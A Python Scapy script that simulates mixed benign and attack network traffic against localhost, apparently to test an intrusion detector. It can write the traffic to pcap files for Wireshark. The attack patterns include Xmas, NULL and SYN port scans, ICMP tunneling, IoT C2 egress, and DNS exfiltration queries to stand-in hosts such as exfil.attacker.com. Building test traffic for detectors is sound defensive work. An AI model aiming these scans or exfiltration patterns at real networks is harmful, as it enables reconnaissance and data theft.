import argparse
import random
import threading
import time
from scapy.all import DNS, DNSQR, Ether, ICMP, IP, PcapWriter, Raw, TCP, UDP, send

TARGET_IP = "127.0.0.1"
ATTACK_INTERVAL = 12

BENIGN_CLIENTS = ["192.168.1.10", "192.168.1.15", "192.168.1.22"]
AUTHORIZED_IOT_NODES = ["192.168.50.10", "192.168.50.11"]

ATTACKER_IPS = {
    "xmas": "10.0.0.66",
    "null": "10.0.0.77",
    "scan": "10.0.0.88",
    "icmp": "10.0.0.99",
    "oversized": "10.0.0.111",
    "mqtt": "192.168.50.12",
    "iot_c2": "192.168.50.18",
    "dns_len": "192.168.50.20",
    "dns_entropy": "192.168.50.21",
}

pcap_writer = None
offline_only = False


def emit_packet(ip_pkt):
  """Sends packet onto the wire and/or writes an Ethernet frame to a Wireshark .pcap file."""
  if pcap_writer is not None:
    # Wrap IP packet in an Ethernet frame so Wireshark decodes Layer 2 cleanly
    pcap_writer.write(Ether() / ip_pkt)
  if not offline_only:
    send(ip_pkt, verbose=False)


def build_benign_packet():
  traffic_type = random.choices(
      ["TCP_WEB", "UDP_DNS", "ICMP_PING", "IOT_MQTT_TLS"],
      weights=[0.45, 0.25, 0.10, 0.20],
  )[0]

  if traffic_type == "TCP_WEB":
    src_ip = random.choice(BENIGN_CLIENTS)
    dport = random.choice([80, 443])
    return (
        IP(src=src_ip, dst=TARGET_IP)
        / TCP(sport=random.randint(1024, 65535), dport=dport, flags="PA")
        / Raw(load="GET /status HTTP/1.1\r\nHost: internal.lab\r\n\r\n")
    )
  elif traffic_type == "UDP_DNS":
    src_ip = random.choice(BENIGN_CLIENTS)
    domain = random.choice(
        ["api.github.com", "time.cloudflare.com", "updates.ubuntu.com"]
    )
    return (
        IP(src=src_ip, dst=TARGET_IP)
        / UDP(sport=random.randint(1024, 65535), dport=53)
        / DNS(rd=1, qd=DNSQR(qname=domain))
    )
  elif traffic_type == "IOT_MQTT_TLS":
    src_ip = random.choice(AUTHORIZED_IOT_NODES)
    return (
        IP(src=src_ip, dst=TARGET_IP)
        / TCP(sport=random.randint(1024, 65535), dport=8883, flags="PA")
        / Raw(load=b"\x17\x03\x03\x00\x20encrypted_telemetry_payload")
    )
  else:
    src_ip = random.choice(BENIGN_CLIENTS)
    return (
        IP(src=src_ip, dst=TARGET_IP)
        / ICMP(type=8, code=0)
        / Raw(load="ping_payload_32_bytes_standard!!")
    )


def generate_benign_traffic():
  while True:
    emit_packet(build_benign_packet())
    time.sleep(random.uniform(0.05, 0.25))


def inject_xmas_scan():
  src = ATTACKER_IPS["xmas"]
  print(f"[ATTACK 1/9] Injecting Xmas Scan from {src}...")
  for port in [21, 22, 80, 443]:
    emit_packet(
        IP(src=src, dst=TARGET_IP) / TCP(sport=44444, dport=port, flags="FPU")
    )
    if not offline_only:
      time.sleep(0.05)


def inject_null_scan():
  src = ATTACKER_IPS["null"]
  print(f"[ATTACK 2/9] Injecting NULL Scan from {src}...")
  for port in [22, 80, 443, 8080]:
    emit_packet(
        IP(src=src, dst=TARGET_IP) / TCP(sport=55555, dport=port, flags=0)
    )
    if not offline_only:
      time.sleep(0.05)


def inject_port_scan():
  src = ATTACKER_IPS["scan"]
  print(f"[ATTACK 3/9] Injecting Horizontal SYN Port Scan from {src}...")
  for batch in range(3):
    base_port = 1000 + (batch * 100)
    for port in range(base_port, base_port + 16):
      emit_packet(
          IP(src=src, dst=TARGET_IP) / TCP(sport=33333, dport=port, flags="S")
      )
      if not offline_only:
        time.sleep(0.01)


def inject_suspicious_icmp():
  src = ATTACKER_IPS["icmp"]
  print(f"[ATTACK 4/9] Injecting Oversized ICMP Tunneling Payload from {src}...")
  payload = "X" * 400
  for _ in range(3):
    emit_packet(
        IP(src=src, dst=TARGET_IP) / ICMP(type=8, code=0) / Raw(load=payload)
    )
    if not offline_only:
      time.sleep(0.1)


def inject_oversized_packet():
  src = ATTACKER_IPS["oversized"]
  print(f"[ATTACK 5/9] Injecting MTU-Violating Oversized Packet from {src}...")
  payload = "A" * 1600
  for _ in range(3):
    emit_packet(
        IP(src=src, dst=TARGET_IP)
        / UDP(sport=12345, dport=9999)
        / Raw(load=payload)
    )
    if not offline_only:
      time.sleep(0.1)


def inject_unencrypted_mqtt():
  src = ATTACKER_IPS["mqtt"]
  print(f"[ATTACK 6/9] Injecting Unencrypted IoT MQTT Traffic from {src}...")
  topics = [
      b"\x30\x16\x00\x0csensor/temp72.4F",
      b"\x30\x18\x00\x0elock/front/open",
      b"\x30\x17\x00\x0dcam/living/on",
  ]
  for payload in topics:
    emit_packet(
        IP(src=src, dst=TARGET_IP)
        / TCP(sport=51234, dport=1883, flags="PA")
        / Raw(load=payload)
    )
    if not offline_only:
      time.sleep(0.1)


def inject_unauthorized_iot_outbound():
  src = ATTACKER_IPS["iot_c2"]
  print(f"[ATTACK 7/9] Injecting Unauthorized IoT C2 Egress from {src}...")
  for c2_ip in ["203.0.113.45", "198.51.100.88", "203.0.113.99"]:
    emit_packet(
        IP(src=src, dst=c2_ip) / TCP(sport=49152, dport=4444, flags="S")
    )
    if not offline_only:
      time.sleep(0.1)


def inject_length_dns_tunneling():
  src = ATTACKER_IPS["dns_len"]
  print(f"[ATTACK 8/9] Injecting Length-Based DNS Exfiltration from {src}...")
  chunks = [
      "a8f9c2e1b4d709123456789abcdef0123456789abcdef.exfil.attacker.com",
      "ff00112233445566778899aabbccddeeff00112233445.exfil.attacker.com",
      "99887766554433221100ffeeddccbbaa9988776655443.exfil.attacker.com",
  ]
  for query in chunks:
    emit_packet(
        IP(src=src, dst=TARGET_IP)
        / UDP(sport=54321, dport=53)
        / DNS(rd=1, qd=DNSQR(qname=query))
    )
    if not offline_only:
      time.sleep(0.1)


def inject_entropy_dns_tunneling():
  src = ATTACKER_IPS["dns_entropy"]
  print(f"[ATTACK 9/9] Injecting High-Entropy Stealth DNS Beacon from {src}...")
  beacons = [
      "9f8e7d6c5b4a3210fedcba.c2server.net",
      "k7m2p9x4q1z8w3v6n5b0r2.c2server.net",
      "a1b9c8d2e7f3g6h4j5k0m8.c2server.net",
  ]
  for query in beacons:
    emit_packet(
        IP(src=src, dst=TARGET_IP)
        / UDP(sport=54322, dport=53)
        / DNS(rd=1, qd=DNSQR(qname=query))
    )
    if not offline_only:
      time.sleep(0.1)


ALL_ATTACKS = [
    inject_xmas_scan,
    inject_null_scan,
    inject_port_scan,
    inject_suspicious_icmp,
    inject_oversized_packet,
    inject_unencrypted_mqtt,
    inject_unauthorized_iot_outbound,
    inject_length_dns_tunneling,
    inject_entropy_dns_tunneling,
]


def attack_scheduler():
  idx = 0
  while True:
    time.sleep(ATTACK_INTERVAL)
    ALL_ATTACKS[idx % len(ALL_ATTACKS)]()
    idx += 1


if __name__ == "__main__":
  parser = argparse.ArgumentParser(
      description="Network Traffic & Attack Simulator (Wireshark PCAP Compatible)"
  )
  parser.add_argument(
      "-e",
      "--export-pcap",
      type=str,
      default=None,
      help="Mirror live simulated traffic into a Wireshark .pcap file",
  )
  parser.add_argument(
      "-o",
      "--offline-pcap",
      type=str,
      default=None,
      help="Generate a complete benign + attack .pcap file immediately without live sending",
  )
  args = parser.parse_args()

  if args.offline_pcap:
    offline_only = True
    pcap_writer = PcapWriter(args.offline_pcap, append=False, sync=True)
    print(f"[*] Generating offline Wireshark PCAP: {args.offline_pcap}")
    for _ in range(50):
      emit_packet(build_benign_packet())
    for attack_fn in ALL_ATTACKS:
      attack_fn()
    pcap_writer.close()
    print(f"[+] Saved {args.offline_pcap}. Open it in Wireshark or replay with standalone_analyzer.py --pcap.")
  else:
    if args.export_pcap:
      pcap_writer = PcapWriter(args.export_pcap, append=True, sync=True)
      print(f"[*] Mirroring simulated packets to Wireshark file: {args.export_pcap}")

    print(f"Starting traffic simulator targeting {TARGET_IP}...")
    print(
        "Generating continuous baseline traffic + 9 attack waves every"
        f" {ATTACK_INTERVAL}s."
    )

    benign_thread = threading.Thread(target=generate_benign_traffic, daemon=True)
    benign_thread.start()

    try:
      attack_scheduler()
    except KeyboardInterrupt:
      print("\nTraffic simulation stopped.")
    finally:
      if pcap_writer is not None:
        pcap_writer.close()